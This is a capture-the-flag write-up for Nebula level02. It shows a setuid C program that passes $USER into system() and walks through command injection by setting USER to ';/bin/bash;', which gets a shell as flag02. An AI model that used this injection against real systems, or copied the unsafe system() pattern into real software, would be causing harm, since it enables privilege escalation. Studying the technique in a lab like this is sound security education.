# For level02 in nebula

>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
>  
>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

### The Program

As usual, before we rekt the program, we must first give it the dignity of running as the developer intended.

```
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
level02@nebula:/home/flag02$ 
```

This program is a setuid program.
```
level02@nebula:/home/flag02$ ls -l flag02
-rwsr-x--- 1 flag02 level02 7438 2011-11-20 21:22 flag02
```

This is the source code of the program in C
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

Firstly, the real, effective and saved UID of the process is set to `flag02`. Then it stores the `$USER` environment variable in a string pointed to by variable `buffer`. Whatever is in that string is called by `system()`.

Because the absolute path of `/bin/echo` is provided, we can no longer manipulate the `$PATH` variable to redirect the program to our malicious `echo` program like in `level01`.

### Crafting the exploit

Another approach is needed.

To be able to solve this challenge, we must be aware of 2 facts:

1. We can string together 2 or more shell commands with `;` into a single line. e.g
```
flag02@nebula:/home/flag02$ echo hi; echo bye
hi
bye
```
2. We can change the `$USER` environment variable to different value using `export` like we did for `$PATH` in `level01`. ie
```
level02@nebula:/home/flag02$ echo $USER
level02
level02@nebula:/home/flag02$ export USER=";/bin/bash;"
level02@nebula:/home/flag02$ echo $USER
;/bin/bash;
```
By right, `$USER` serves a purpose as described [here](http://man7.org/linux/man-pages/man1/login.1.html).

>The value for $HOME, $USER, $SHELL, $PATH, $LOGNAME, and $MAIL are set according to the appropriate fields in the password entry.

But this is irrelevant for now. Now, it serves only *our* needs.

Combining these 2 facts, all we need to do is `export USER=";/bin/bash;"`. Then run the program.
```
level02@nebula:/home/flag02$ export USER=";/bin/bash;"
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo ;/bin/bash; is cool")

flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```
When `system("/bin/echo ;/bin/bash; is cool")` is called, it is like entering `flag02@nebula:/home/flag02$ /bin/echo ;/bin/bash; is cool` in the shell. `/bin/echo` executes without anything to echo, then `/bin/bash` is run, giving us a bash shell as user `flag02`. After we exit, then `is cool` is executed, but there is no such command, so bash gives us an error, but it doesn't matter here.
```
flag02@nebula:/home/flag02$ exit
exit
sh: is: command not found
level02@nebula:/home/flag02$ 
```

END
